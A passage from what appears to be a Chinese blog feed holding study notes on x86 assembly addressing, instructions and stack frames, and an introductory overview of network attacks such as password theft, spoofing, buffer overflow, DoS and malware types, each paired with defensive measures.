中的值和指令中给出的有效地址直接形成。</p><p>上述指令中，操作数的物理地址应为DS:3100H。如果在指令中使用段超越前缀指定使用的段，则可以从其他段中取出数据，如：<code>MOV AL, ES:[3100H]</code>。</p><h4 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h4><p>间接寻址是<strong>相对直接寻址</strong>而言的，在间接寻址的情况下，指令地址字段中的形式地址不是操作数的真正地址，而是操作数地址的指示器，或者说此形式地址单元的内容才是操作数 的有效地址。</p><p>如：<code>MOV [BX], 12H</code></p><p>这是一种寄存器间接寻址，BX寄存器存操作数的偏移地址，操作数的物理地址应该是DS:BX。表示将12H这个数据存储到DS:BX中。</p><blockquote><p>如果操作数存放在寄存器中，通过指定寄存器来获取数据，则称为寄存器寻址。如：<code>MOV BX, 12H</code>表示将12H这个数据存储到BX寄存器中。</p></blockquote><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>操作数的有效地址是一个<strong>基址寄存器（BX, BP）</strong>或<strong>变址寄存器（SI, DI）</strong>的值加上指令中给定的<strong>偏移量之和</strong>。</p><p>如：<code>MOV AX, [DI + 1234H]</code> 操作数的物理地址应该是DS: DI + 1234H。</p><p>与间接寻址相比，可以认为相对寻址是在间接寻址基础上，增加了偏移量。</p><h4 id="基址变址寻址"><a href="#基址变址寻址" class="headerlink" title="基址变址寻址"></a>基址变址寻址</h4><p>将<strong>基址寄存器</strong>的内容，加上<strong>变址寄存器</strong>的内容而形成操作数的有效地址。</p><p>如：<code>MOV EAX, [EBX+ESI]</code>。</p><p>也可以写成<code>MOV EAX, [BX][SI]</code> 或<code>MOV EAX, [SI][BX]</code>。</p><h4 id="相对基址变址寻址"><a href="#相对基址变址寻址" class="headerlink" title="相对基址变址寻址"></a>相对基址变址寻址</h4><p>在基址变址寻址方式融合相对寻址方式，即增加偏移量。</p><p>如：<code>MOV EAX, [EBX+ESI+1000H]</code></p><p>也可以写成<code>MOV EAX, 1000H [BX][SI]</code>。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/daf6b3eec9401e39862c30d968378f6a.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/daf6b3eec9401e39862c30d968378f6a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="汇编—主要指令"><a href="#汇编—主要指令" class="headerlink" title="汇编—主要指令"></a>汇编—主要指令</h2><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><table><thead><tr><th>数据传送指令</th><th>功能</th></tr></thead><tbody><tr><td>MOV 目的操作数,源操作数</td><td>把源操作数送给目的操作数</td></tr><tr><td>LEA 目的数, 源数</td><td>将有效地址传送到指定的寄存器</td></tr><tr><td>XCHG</td><td>交换两个操作数的数据</td></tr><tr><td>PUSH,POP</td><td>把操作数压入或取出堆栈</td></tr><tr><td>PUSHF,POPF,PUSHA,POPA</td><td>堆栈指令群</td></tr><tr><td>LEA,LDS,LES</td><td>取地址至寄存器</td></tr></tbody></table><p><code>mov al,[3100H];</code> 表示将3100H中的数值写入AL寄存器。</p><p><code>lea eax, dword ptr [4*ecx+ebx]</code> </p><p>源数为”dword ptr [4*ecx+ebx]”，即地址为4*ecx+ebx里的数值</p><p>dword ptr是告诉地址里的数值是一个dword型数据。上述lea语句则是将源数的地址4*ecx+ebx赋值给eax。</p><h3 id="位运算指令"><a href="#位运算指令" class="headerlink" title="位运算指令"></a>位运算指令</h3><table><thead><tr><th>位运算指令</th><th>功能</th></tr></thead><tbody><tr><td>AND,OR,XOR,NOT,TEST</td><td>执行BIT与BIT之 间的逻辑运算</td></tr><tr><td>SHR,SHL,SAR,SAL</td><td>移位指令</td></tr><tr><td>ROR,ROL,RCR,RCL</td><td>循环移位指令</td></tr></tbody></table><p><strong>AND (逻辑与)语法：</strong> <code>AND 目标数, 源数</code></p><p>AND运算对两个数进行逻辑与运算 （当且仅当两操作数对应位都为“1”时，结果的相应位为“1”，否则结果相应位为“0”），目标数=目标数 AND 原数。AND指令会清空OF、CF标记，设置ZF标记。</p><h3 id="算数运算指令"><a href="#算数运算指令" class="headerlink" title="算数运算指令"></a>算数运算指令</h3><table><thead><tr><th>算数运算指令</th><th>功能</th></tr></thead><tbody><tr><td>ADD,ADC</td><td>加法指令</td></tr><tr><td>SUB,SBB</td><td>减法指令</td></tr><tr><td>INC,DEC</td><td>将OP的值加一或减一</td></tr><tr><td>NEG</td><td>将OP的符号反相(取二进制补码)</td></tr><tr><td>MUL,IMUL</td><td>乘法指令</td></tr><tr><td>DIV,IDIV</td><td>除法指令</td></tr></tbody></table><p><strong>ADD语法</strong>： <code>ADD 被加数, 加数</code></p><p>加法指令将一个数值加在一个寄存器上或者一个内存地址上</p><p><code>add eax,123</code>; 相当于 eax=eax+123 加法指令对ZF、OF、CF都会有影响。</p><h3 id="程序流程控制指令"><a href="#程序流程控制指令" class="headerlink" title="程序流程控制指令"></a>程序流程控制指令</h3><table><thead><tr><th>程序流程控制指令</th><th>功能</th></tr></thead><tbody><tr><td>CMP</td><td>比较OP1和IOP2的值</td></tr><tr><td>JMP</td><td>跳转到指定地址执行</td></tr><tr><td>LOOP</td><td>循环指令集</td></tr><tr><td>CALL,RET</td><td>子程序调用，返回指令</td></tr><tr><td>INT,IRET</td><td>中断调用及返回指令。在执行INT时,CPU会自动将标志寄存器的值入栈,在执行IRET时，则会将堆栈中的标志值弹回寄存器。</td></tr><tr><td>REP, REPE, REPNE</td><td>重复前缀指令集</td></tr></tbody></table><p><strong>CMP语法</strong>：<code>CMP 目标数, 源数</code></p><p>CMP指令比较两个值并且标记CF、OF、ZF</p><p><code>CMP EAX, EBX</code>比较eax和ebx是否相等，如果相等就设置ZF为1</p><p><strong>CALL语法</strong>：<code>CALL something</code></p><p>CALL指令<strong>将当前EIP中的指令地址压入栈中，并且调用CALL后的子程序</strong>。</p><p>CALL可以这样使用：</p><p><code>CALL 404000</code> 最常见: CALL 地址</p><p><code>CALL EAX</code> CALL 寄存器 - 如果寄存器存的值为404000，那就等同于第一种情况。</p><p><strong>RET语法</strong>：<code>RET</code></p><p>RET指令的功能是从一个代码区域中退出到调用CALL的指令处。</p><h3 id="条件转移命令"><a href="#条件转移命令" class="headerlink" title="条件转移命令"></a>条件转移命令</h3><p>JXX: 当特定条件成立则跳往指定地址执行。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/fd4327f68407eb9d8d96f4bfa8282060.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/fd4327f68407eb9d8d96f4bfa8282060.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="字符串操作指令集"><a href="#字符串操作指令集" class="headerlink" title="字符串操作指令集"></a>字符串操作指令集</h3><table><thead><tr><th>字符串操作指令集</th><th>功能</th></tr></thead><tbody><tr><td>MOVSB,MOVSW,MOVSD</td><td>字符串传送指令</td></tr><tr><td>CMPSB,CMPSW,CMPSD</td><td>字符串比较指令</td></tr><tr><td>SCASB,SCASW</td><td>字符串搜索指令</td></tr><tr><td>LODSB,LODSW,STOSB,STOSW</td><td>字符串载入或存贮指令</td></tr></tbody></table><h2 id="汇编—函数调用示例"><a href="#汇编—函数调用示例" class="headerlink" title="汇编—函数调用示例"></a>汇编—函数调用示例</h2><p>一个简单的C语言程序(VC6,Win32控制台程序)</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> z=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    z=x+y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    n=<span class="built_in">add</span>(<span class="number">1</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,n);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/24e2b5e7af27117de1d235e0fe077d97.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/24e2b5e7af27117de1d235e0fe077d97.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="函数调用前"><a href="#函数调用前" class="headerlink" title="函数调用前"></a>函数调用前</h3><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/a4e46bd11cf82cffd92bfe85bd7dad74.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/a4e46bd11cf82cffd92bfe85bd7dad74.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="函数调用时"><a href="#函数调用时" class="headerlink" title="函数调用时"></a>函数调用时</h3><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/bbd54a92cf3501d3eced78f2e2b9872f.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/bbd54a92cf3501d3eced78f2e2b9872f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="Add函数的汇编代码"><a href="#Add函数的汇编代码" class="headerlink" title="Add函数的汇编代码"></a>Add函数的汇编代码</h3><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/28e95c3a1bd18ff7a05a4a653aa97423.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/28e95c3a1bd18ff7a05a4a653aa97423.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="栈帧切换"><a href="#栈帧切换" class="headerlink" title="栈帧切换"></a>栈帧切换</h4><p><code>004113A0 push ebp</code>； 将EBP的值入栈。</p><p><code>004113A1 mov ebp,esp</code>；将ESP的值赋值给EBP。</p><p><code>004113A3 sub esp, 0CCh</code>；将ESP抬高。</p><p>上面三行汇编代码完成了栈帧切换，即保存了主函数栈帧的EBP的值，也通过改变EBP和 ESP寄存器的值，为add函数分配了栈帧空间。</p><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/cfc053dd354c536a5935c831d2b5f078.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/cfc053dd354c536a5935c831d2b5f078.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="函数状态保存"><a href="#函数状态保存" class="headerlink" title="函数状态保存"></a>函数状态保存</h4><p><code>004113A9 push ebx</code>；用于保存现场，ebx作为内存偏移指针使用。</p><p><code>004113AA push esi</code>；用于保存现场，esi是源地址指针寄存器</p><p><code>004113AB push edi</code>；用于保存现场，edi是目的地址指针寄存器。</p><p><code>004113AC lea edi,[ebp-0CCh]</code>；将ebp-0CCh地址装入EDI。</p><h4 id="栈帧切换-1"><a href="#栈帧切换-1" class="headerlink" title="栈帧切换"></a>栈帧切换</h4><p><code>004113B2 mov ecx,33h</code>；设置计数器数值，即将ECX寄存器赋值为33h</p><p><code>004113B7 mov eax,0CCCCCCCCh</code>；向寄存器EAX赋值</p><p><code>004113BC rep stos dword ptr es:[edi]</code>；循环将栈区数据都初始化为CCh。</p><blockquote><p>rep指令的目的是<strong>重复其上面的指令</strong>。ECX的值是重复的次数。STOS指令的作用是将eax中的值拷贝到ES:EDI指向的地址。</p></blockquote><h4 id="执行函数体"><a href="#执行函数体" class="headerlink" title="执行函数体"></a>执行函数体</h4><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/09afb116ea9376c09bff4a6bd13b2964.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/09afb116ea9376c09bff4a6bd13b2964.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="栈帧情况"><a href="#栈帧情况" class="headerlink" title="栈帧情况"></a>栈帧情况</h4><p><img src="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/4b4adb29f00c0174e43347b043193e83.png" class="lazyload placeholder" data-srcset="/2023/03/11/ruan-jian-an-quan-yu-bei-zhi-shi/4b4adb29f00c0174e43347b043193e83.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><code>[x]=[ebp+8]</code></p><p><code>[y]=[ebp+0ch]</code></p><p><code>[z]=[ebp-8]</code><u>这个是基于VS2005编译的</u></p><h3 id="恢复状态"><a href="#恢复状态" class="headerlink" title="恢复状态"></a>恢复状态</h3><p>函数调用完毕，而函数的返回值将存储在EAX寄存器中。之后，函数调用完毕后，将恢复栈状态到main函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">004113D1 pop edi；恢复寄存器值 </span><br><span class="line"></span><br><span class="line">004113D2 pop esi；恢复寄存器值 </span><br><span class="line"></span><br><span class="line">004113D3 pop ebx；恢复寄存器值</span><br><span class="line"></span><br><span class="line">0004113D4 mov esp,ebp；恢复寄存器值</span><br><span class="line"></span><br><span class="line">004113D6 pop ebp；恢复寄存器值 </span><br><span class="line"></span><br><span class="line">004113D7 ret；根据返回地址恢复EIP值，相当于pop EIP。</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 预备知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全概论</title>
      <link href="/2023/03/11/wang-luo-an-quan-gai-lun/"/>
      <url>/2023/03/11/wang-luo-an-quan-gai-lun/</url>
      
        <content type="html"><![CDATA[<h2 id="为什么会存在网络安全问题"><a href="#为什么会存在网络安全问题" class="headerlink" title="为什么会存在网络安全问题"></a>为什么会存在网络安全问题</h2><ol><li>开放的网络</li><li>存储转发技术</li><li>漏洞或者脆弱性</li></ol><p>网络安全的主要任务：保护联网计算机系统不被入侵，保证<strong>存储</strong>在计算机系统中的数据以及在网络上<strong>传输</strong>的数据不被窃取、篡改和伪造。简而言之就是看机护网。</p><p><strong>网络安全任务</strong></p><ol><li>保障数据机密性(Confidentiality)：保证存储和传输中的数据不被第三方读取</li><li>保障数据完整性(Integrity)：保证存储和传输中的数据不被第三者篡改</li><li>保障数据和服务的可用性(Availability)：保证计算机系统资源不会被第三者通过漏洞阻碍合法用户使用</li><li>保障数据的不可否认性：保证数据的合法拥有者无法想向人抵赖自己是该数据的拥有者 </li></ol><br/><h2 id="窃听和密码分析攻击"><a href="#窃听和密码分析攻击" class="headerlink" title="窃听和密码分析攻击"></a>窃听和密码分析攻击</h2><p>窃听：利用网络通信设备和技术，窃取处于传输状态中的数据</p><ol><li>首先需要知道窃听的网络报文经过哪些路径传输</li><li>在这些路径中，安插自己的网络设备或者安装自己的嗅探软件(tcpdump/wireshark)</li></ol><br/><p><strong>密码分析</strong></p><p>在不知道密钥的情况下找出密文对应的原文，或者至少找出一些有价值的东西，密码分析是一门科学，也是一门艺术，因为包含依靠经验进行猜测的成分，任何能从密文挖掘有用信息的方法都是有用的。分析密文的统计特征（如置换加密，英文中e出现频率最高）</p><p>防御措施：用更长的密钥和更安全的加密算法</p><br/><h2 id="盗窃登录密码攻击"><a href="#盗窃登录密码攻击" class="headerlink" title="盗窃登录密码攻击"></a>盗窃登录密码攻击</h2><p>登录密码是用户的第一道防线，也可能是唯一防线</p><p>窃取登陆密码方法：密码猜测、键盘记录攻击、URL重定向攻击、密码嗅探、字典攻击、侧信道攻击、社交工程（身份伪装、网络钓鱼）</p><ol><li><p>密码猜测：最容易，特别是短小或缺省的密码</p></li><li><p>社交工程：用社交手段获取私密信息</p></li></ol><ul><li>身份伪装：攻击者伪装成别人去欺骗受害者</li><li>网络钓鱼：伪装电子邮件或者网站进行的攻击。一般而言，任何钓鱼邮件都包括一个超级链接到一个假冒网站，称之为钓鱼网站。</li></ul><p>网络钓鱼防御措施：在浏览器安装抗钓鱼模块可用来检测和阻止用户进入钓鱼网页</p><ol start="3"><li>URL重定向攻击：将用户欲上的网址自动改成攻击者指定的网址，通过更改域名系统（DNS）或者用户主机上hosts文件完成</li></ol><p>防御措施：确保域名系统和hosts文件不被非法修改，并在上网之前先进行域名合法性验证</p><ol start="4"><li>字典攻击</li></ol><p>计算机验证用户身份步骤：用户在登陆时输入用户名和密码，计算机对密码进行加密得到密文，将该密文和密码文件中存储的该用户名对应的密码（加密后）进行比对，如果相同则通过登陆，否则拒绝。登录密码经过加密后存储在主机系统中。</p><p>UNIX/Linux：用户登录密码存储在/etc文件夹下一个叫shadows的系统文件中</p><p>Windows：用户登陆密码存储在系统的注册表中一个叫SAM的文件中</p><p>一个典型的字典攻击过程如下：</p><ul><li>收集、获取用户名信息和对应的加密密码</li><li>用散列算法逐一加密所有单词、日期、人名等</li><li>将盗取的密文和上一步骤计算出的密文逐一比较，找出相同者则得到对应的明文即是登录密码</li></ul><p>难点：将所有的单词、日期、人名和地名加密并存储起来需要很大的存储空间，构造一个彩虹表有助于节省存储空间</p><p>彩虹表是针对各种可能的字母组合预先计算好的散列链表合集，为破解密码的散列值而准备。一般主流的彩虹表都在100G以上。</p><ol start="5"><li>密码嗅探</li></ol><p>常用的网络应用程序，如FTP，SMTP，POP3，HTTP，通常要求用户输入用户名和登录密码验明身份后才能使用。</p><p>密码嗅探就是侦听这类应用程序的网包，以便截获远程登录信息，比如用户名和密码</p><p>防御措施：加密所有信息，包括登录信息，使用远程登录软件，比如SSH和HTTPS</p><ol start="6"><li>侧信道攻击</li></ol><p>在社交网站(如Facebook、领英LinkedIn、Twitter、微博等)上发布的照片、文字，可能会泄露用户的地点、生日、爱好、家人、学校、工作等隐私，威胁到用户的各种网上账户的安全。</p><p>2012年一次黑客攻击，使得LinkedIn的600多万用户的登录密码被窃取。如果用户的多个账户使用同一个密码，一旦泄漏会影响多个账户的安全。</p><p>因此，应避免在网络上公开自己的隐私信息，并且为不同账号设置不同密码。</p><br/><ol start="7"><li>键盘记录攻击</li></ol><p>软件攻击：通过运行在计算机上的软件用来截获、记录键盘输入，窃取用户的输入密码等秘密信息。</p><p>硬件攻击：通过分析键盘敲击时发出的电磁辐射信号或者声音震动变化来窃取用户输入的内容。</p><p>抵御方法：需要使用抵抗键盘记录攻击的软件或硬件，来防止此类攻击的威胁。</p><br/><p>密码保护（保护密码不被窃取的准则）</p><ol><li>选择长密码，适当加入数字和其他不常用的字符，增加字典攻击的难度。</li><li>不要轻易告诉他人你的密码，如果一定要将密码告诉信任的人，避免使用电话或者电子邮件，请当面交给此人。</li><li>经常更改密码，不要重复使用旧密码。</li><li>不同的账户要使用不同的密码。</li><li>不要使用不加密登录信息的远程软件。</li><li>用碎纸机切碎丢弃的个人纸张。</li><li>不在自动弹出的窗口中输入登录密码，不在可疑的邮件中点击任何连接。</li></ol><br/><h2 id="身份欺骗攻击"><a href="#身份欺骗攻击" class="headerlink" title="身份欺骗攻击"></a>身份欺骗攻击</h2><p>身份欺骗攻击，冒充受害者身份，不用受害者密码即可实施攻击。</p><ul><li>中间人攻击</li></ul><p>攻击者在甲、乙两人通信线路中安装网络设备或窃听软件，并在甲、乙双方之间传输经过阅读、修改、伪造后的数据。</p><p>防御措施：加密通信，身份认证</p><ul><li>重放攻击</li></ul><p>攻击者首次拦截了一个合法的信息，经过一段时间后，原封不动地将此消息发给最初的接受者。</p><p>防御机制：给消息附加一个<strong>现时数</strong>（nonce，只出现一次的随机数），用于代表某个特定信息。但是接收方需要存储接收到的所有随机数，存储开销太大。</p><p>给消息附上<strong>时间戳</strong>。但是互联网上的计算机的时钟可能不一致（局域网没问题)</p><p>最佳方法是同时使用现时数和时间戳。假设互联网中主机之间的最大时间戳误差为△，假设主机A内部时钟当前时刻为t，则在下一个时刻到来之前A只需保存所有时间戳落在W=[t-△，t+△]内的现时数。即主机A只接受<strong>时间戳落在区间W内且现时数是第一次出现</strong>的信息。</p><ul><li>IP欺骗攻击</li></ul><p><strong>TCP劫持（需要借助SYN泛洪攻击）</strong></p><p>SYN泛洪攻击：攻击者向攻击目标计算机发送大量的SYN控制包，使得被攻击主机不得与其他计算机通信。</p><ol><li>攻击者给目标计算机发送大量的SYN控制包，目标计算机被迫给SYN控制包内的源IP地址发送ACK控制包</li><li>由于SY控制包的源P地址是伪造的，导致网络不可达，所以受害主机不能在短时间内收到对应的ACK响应包，因此SYN控制包继续停留在目标主机的TCP缓冲区中</li><li>目标机的TCP缓冲区被SYN控制包耗尽，无法与其他主机通信</li></ol><p>TCP劫持：A是公司的一名雇员，准备要远程登录到公司主机V，A和V的TCP连接有可能被劫持，过程如下：</p><ol><li>A向主机V发了SYN包请求远程登录</li><li>攻击者劫持了这个报文，用SYN泛洪方法攻击V，使得V无法完成三次握手</li><li>攻击者用正确的TCP序号和ACK确认号，以V的名义（但以攻击者自己的IP地址）给A发送SYN/ACK报文</li><li>A收到SYN/ACK报文，并发送ACK响应报文给攻击者。至此，攻击者与A完成TCP握手，建立连接</li></ol><p>TCP劫持产生原因：TCP协议使用TCP序列号和ACK响应号来确定哪些TCP包是属于同一个连接的，TCP协议不检查起始IP地址是否已经被篡改。防御措施：在TCP层中记录并检测属于同一个连接的起始IP地址是否有变，如TCP wrapper工具</p><br/><p><strong>ARP欺骗（也称之为ARP投毒）</strong></p><p>MAC地址是每张网卡的物理地址，全球唯一。ARP协议是将IP地址转换成MAC地址的链路层协议。ARP欺骗是将受害者主机IP地址对应的MAC地址偷换成攻击者指定的MAC地址，以取代受害者与他人通信。</p><p>防御方法：检测和强化IP和MAC之间映射关系</p><br/><h2 id="缓冲区溢出、抵赖、入侵、流量分析、拒绝服务攻击、垃圾邮件"><a href="#缓冲区溢出、抵赖、入侵、流量分析、拒绝服务攻击、垃圾邮件" class="headerlink" title="缓冲区溢出、抵赖、入侵、流量分析、拒绝服务攻击、垃圾邮件"></a>缓冲区溢出、抵赖、入侵、流量分析、拒绝服务攻击、垃圾邮件</h2><p><strong>缓冲区溢出攻击</strong></p><p>缓冲区溢出，又名缓冲区超限，是一种常见的软件漏洞。即程序进程给该缓冲区写入多过其容量的内容，则缓冲区溢出。</p><p>攻击者可利用缓冲区溢出，重定向受害者的程序去执行自己的代码，这类攻击常常利用了某些函数，<strong>数据放在堆内</strong>，<strong>函数调用的返回地址放在栈内</strong>。在c语言中，strcpy()允许在缓冲区中存入比缓冲区长的字符串。</p><p>缓冲区溢出步骤</p><ol><li>找到一个允许缓冲区溢出的程序（例如，找到一个程序使用了不检查边界的函数，如strcpy、strcat）</li><li>将攻击者的可执行代码存入内存</li><li>计算出需拷贝到缓冲区的字符串的长度</li><li>拷贝数据，使缓冲区溢出，数据跨堆入栈，修改函数返回地址，使其执行攻击者程序</li></ol><p>防御措施：检查要写入缓冲区的内容的界限，如采用strncpy、strncat；在编译器中加入哨兵值用于检测缓冲区溢出攻击</p><br/><p><strong>抵赖</strong></p><p>数据的拥有者不承认自己产生和传输过数据，或不承认曾经收到过某些特定的数据。</p><p>防御途径：身份认证</p><br/><p><strong>入侵</strong></p><p>未授权用户进入他人计算机系统，利用系统配置漏洞、通信协议缺陷和软件漏洞实现非法入侵他人系统。入侵检测是一种探测入侵行为的技术，关闭不常用的网络端口，能有效降低被入侵的几率。<strong>IP扫描和端口扫描</strong>是重要的攻击工具，前者用于寻找联网的计算机的IP地址，后者用于探测这些IP上开放了哪些端口。Nmap是常用的IP和端口扫描工具。</p><br/><p><strong>流量分析</strong></p><p>通过分析IP包发现参与通信的各方及其通信量。通过IP包头可以知道通信的起始IP地址和终点IP地址，通过传输层端口号可以知道通信双方具体在使用哪个应用。</p><p>防御措施：加密整个IP报文，但是加密后的IP包头不能送达目的地，需要使用网关。网关是特殊的计算机，设在局域网的进出口处，使得局域网的所有主机必须经网关与外界通信。</p><p>用网关传递加密的IP包</p><ol><li>发送IP包到网关A</li><li>网关A加密整个IP包，添加新IP包头并传往下一个路由器</li><li>IP包仅由网关A传送到网关B</li><li>网关B去掉IP包头，解密发送者的IP包，并将其发送给接收者</li></ol><br/><p><strong>拒绝服务攻击</strong></p><p>阻止合法用户得到正常通信和计算资源</p><ul><li><p>DoS-由单台计算机发起攻击</p></li><li><p>DDoS-分布式拒绝服务攻击，由多台计算机发起攻击</p></li></ul><p>smuf攻击一种典型的Dos攻击，是一种借刀杀人的攻击，攻击步骤如下：</p><ol><li>攻击者采用目标主机的IP为源IP，在一个短时间内向一组计算机发送大量ping命令</li><li>根据ICMP协议规范，收到ping指令的计算机会向源IP回送pong消息</li><li>目标主机在短时间内处理大量pong消息导致瘫痪</li></ol><br/><p>典型的DDos攻击过程如下：</p><ol><li>利用主控机（Botmaster）扫描尽可能多的联网计算机</li><li>利用漏洞入侵计算机，安装一个特殊的攻击软件，这些机器称为僵尸主机（Zombie）</li><li>主控机命令所有僵尸主机同时向同一目标发起DoS攻击（发送SYN报文）</li></ol><br/><p><strong>垃圾邮件</strong></p><p>垃圾邮件是不请自来的信息，多是商业信息，或钓鱼信息。目的虽然不是危害用户主机工作，但仍然消耗了计算资源，并且浪费用户时间去辨别和清除这些邮件。</p><p>防御措施：垃圾邮件过滤软件能够检测和阻止垃圾邮件进入用户邮箱</p><br/><h2 id="恶意软件"><a href="#恶意软件" class="headerlink" title="恶意软件"></a>恶意软件</h2><p>危害用户计算机的软件统称为恶意软件。病毒、蠕虫、木马、逻辑炸弹、后门程序、间谍软件、僵尸软件。</p><p><strong>病毒和蠕虫</strong></p><p>病毒是可以自我复制的软件。它不是一种孤立的程序，它必须依附一个主程序（如一个可执行程序)或文件中（包含宏指令的微软办公文件）；用户必须打开含病毒的文件或者执行含病毒的程序；一般不会自我传播。</p><p>蠕虫可称为通过网络传播的恶性病毒。可以<strong>单独生存</strong>，不必依附载体。可以<strong>自我执行</strong>，<strong>自我传播</strong>。</p><p>防御方法：不要从非信任源下载软件、不要运行来路不明的程序、确保及时安装和更换补丁软件</p><p><strong>木马</strong></p><p>木马是一种含有隐蔽功能的软件，表面上在做一件事，实际上在做另一件事，一般不会自我复制和自我传播，主要潜伏在主机中窃取用户资料，不易察觉。木马常常将自己伪装成其他正常软件，诱使人们下载执行，如将软件命名为Real Player.exe，与RealPlayer.exe很像。</p><p>防御方法：运用杀毒软件可以检测、隔离和删除它。</p><br/><p><strong>逻辑炸弹</strong></p><p>逻辑炸弹是由开发人员植入在程序内的子程序或指令，当条件满足时，会触发执行。</p><p>防御措施：加强对员工的管理，指定完善的软件开发流程和制度。项目管理者应该组建专门的团队检查源程序。司法部门应该制定相应法律，严惩置入逻辑炸弹的员工。</p><br/><p><strong>后门</strong></p><p>后门程序是指按非正常途径进入软件的密码通道，允许程序开发人员绕开正常的身份检查机制，方便其修改、调试代码。</p><p>防御方法：聘请专门的团队来检查源代码</p><br/><p><strong>间谍软件</strong></p><p>是专门攻击网页浏览器的恶意软件，常用于监视用户浏览习惯并且时常弹出商业广告骚扰用户。可细分为如下几类：</p><ol><li>浏览监视：监视用户浏览习惯，发送报告给网页服务器或攻击者主机，告知用户的网购习惯和模式。</li><li>浏览器劫持：篡改用户浏览器设置，改写浏览器默认初始页面，将其转到攻击者设定的网页。</li><li>密码窃取：通过击键记录软件记录用户敲击的按键来窃取用户的登录信息。</li><li>广告软件：在用户的网页上自动显示广告窗口。</li></ol><p>防御方法：使用抗间谍软件来检测和清除间谍软件</p><br/><p><strong>僵尸软件</strong></p><p>是攻击者用于劫持用户主机的软件工具，如攻击者为发送DDoS攻击而植入的软件，等待攻击者的指令，向目标实施攻击。</p><p>防御方法：加强系统安全管理，使用户主机不被利用成为攻击者的僵尸主机。</p><h2 id="攻击者分类"><a href="#攻击者分类" class="headerlink" 